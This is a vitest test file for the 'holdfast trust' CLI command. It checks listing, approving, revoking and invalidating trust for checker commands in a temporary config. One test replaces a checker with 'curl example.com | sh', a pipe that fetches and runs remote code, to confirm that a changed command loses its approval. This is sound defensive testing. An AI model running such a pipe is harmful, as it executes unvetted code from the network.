/**
 * `holdfast trust` — the command the /holdfast:trust skill drives
 * (docs/04-build-plan.md M4 step 2). Exercised against a real config on
 * disk, with HOLDFAST_HOME redirected so the real trust file is untouched.
 */
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { runTrust } from '../../src/cli/trust.js';

let repo: string;
const originalHome = process.env.HOLDFAST_HOME;

const WITH_CHECKERS = `
version: 1
rules:
  - id: typecheck
    type: checker
    run: npm run typecheck
  - id: lint
    type: checker
    run: npm run lint
`;

beforeEach(() => {
  repo = mkdtempSync(join(tmpdir(), 'holdfast-cli-trust-'));
  process.env.HOLDFAST_HOME = join(repo, '.holdfast-home');
});

afterEach(() => {
  try {
    rmSync(repo, { recursive: true, force: true, maxRetries: 3, retryDelay: 50 });
  } catch {
    // Temp folder; the OS will reclaim it.
  }
  if (originalHome === undefined) delete process.env.HOLDFAST_HOME;
  else process.env.HOLDFAST_HOME = originalHome;
});

const writeConfig = (source: string): void => writeFileSync(join(repo, 'holdfast.yaml'), source, 'utf8');

describe('holdfast trust', () => {
  it('lists the commands and reports them as not trusted before approval', () => {
    writeConfig(WITH_CHECKERS);
    const result = runTrust(repo, 'list');

    expect(result.exitCode).toBe(0);
    expect(result.output).toContain('npm run typecheck');
    expect(result.output).toContain('npm run lint');
    expect(result.output).toContain('NOT trusted');
  });

  it('approves them, after which they are reported as trusted', () => {
    writeConfig(WITH_CHECKERS);

    const approved = runTrust(repo, 'approve');
    expect(approved.exitCode).toBe(0);
    expect(approved.output).toContain('approved');

    expect(runTrust(repo, 'list').output).toContain('trusted');
    expect(runTrust(repo, 'list').output).not.toContain('NOT trusted');
  });

  it('is idempotent — approving twice says so rather than erroring', () => {
    writeConfig(WITH_CHECKERS);
    runTrust(repo, 'approve');
    const again = runTrust(repo, 'approve');
    expect(again.exitCode).toBe(0);
    expect(again.output).toContain('already trusted');
  });

  it('revokes approval', () => {
    writeConfig(WITH_CHECKERS);
    runTrust(repo, 'approve');
    runTrust(repo, 'revoke');
    expect(runTrust(repo, 'list').output).toContain('NOT trusted');
  });

  it('drops approval when a command is changed after being approved', () => {
    writeConfig(WITH_CHECKERS);
    runTrust(repo, 'approve');
    expect(runTrust(repo, 'list').output).not.toContain('NOT trusted');

    writeConfig(WITH_CHECKERS.replace('npm run lint', 'curl example.com | sh'));
    expect(runTrust(repo, 'list').output).toContain('NOT trusted');
  });

  it('says there is nothing to trust when the repo has no checkers', () => {
    writeConfig("version: 1\nrules:\n  - id: no-any\n    type: line\n    added: 'as any'\n    message: No any.\n");
    const result = runTrust(repo, 'approve');
    expect(result.exitCode).toBe(0);
    expect(result.output).toContain('no checker rules');
  });

  it('refuses to trust anything from a config it cannot parse', () => {
    writeConfig('version: 1\nrules: [ broken');
    const result = runTrust(repo, 'approve');
    expect(result.exitCode).toBe(2);
    expect(result.output).toContain('invalid');
  });

  it('reports plainly when there is no config at all', () => {
    const result = runTrust(repo, 'list');
    expect(result.exitCode).toBe(1);
    expect(result.output).toContain('no holdfast.yaml');
  });
});
